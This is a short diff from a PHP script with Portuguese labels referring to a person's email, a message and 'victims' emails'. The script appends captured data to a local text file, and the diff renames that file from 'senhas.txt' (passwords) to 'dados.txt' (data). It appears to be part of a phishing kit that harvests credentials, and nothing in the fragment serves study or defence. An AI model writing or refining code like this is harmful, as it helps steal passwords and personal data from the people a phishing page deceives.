@@ -20,7 +20,7 @@ $seuemail="EMAIL DA PESSOA:\r";
 $mensagem="Mensagem:"."\r";
 $emailvitima="EMAIL DAS VTIMAS:";
 
-$file = fopen("senhas.txt","a");
+$file = fopen("dados.txt","a");
 
 
 $escrever1=fwrite($file, $traco);
